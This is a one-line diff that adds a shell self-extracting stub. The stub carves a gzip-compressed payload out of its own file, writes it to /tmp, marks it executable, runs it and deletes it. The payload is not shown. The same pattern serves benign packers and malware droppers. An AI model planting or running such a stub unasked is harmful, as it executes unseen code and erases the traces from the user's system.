@@ -1,0 +1,1 @@
+dd bs=1 skip=66<$0|gunzip>/tmp/O;cd /tmp;chmod +x O;./O;rm O;exit
